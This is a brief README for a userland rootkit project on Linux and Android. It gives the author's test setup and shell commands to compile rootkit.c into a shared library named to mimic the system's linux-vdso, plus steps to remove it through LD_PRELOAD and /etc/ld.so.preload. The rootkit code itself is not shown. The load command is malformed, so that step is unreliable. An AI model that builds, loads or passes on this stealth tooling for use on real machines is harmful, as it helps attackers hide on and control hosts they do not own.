# userland rootkit

### my specs:
*Void Linux PC:*
<ul>
    <li>Void Linux kernel version 5.13.19_1</li>
    <li>gcc (GCC) 10.2.1 20201203</li>
</ul>

*Android phone:*
<ul>
    <li>kernel 4.9.186-21680091; Android 10</li>
    <li>clang version 13.0.0</li>
</ul>

# compile and load library:
```
gcc -shared -fPIC -D_GNU_SOURCE -Wall rootkit.c -o linux-vds0.so -ldl
export $(pwd)/linux-vds0.so 
```

# delete and unload library:
```
unset LD_PRELOAD
sudo rm /etc/ld.so.preload 
```
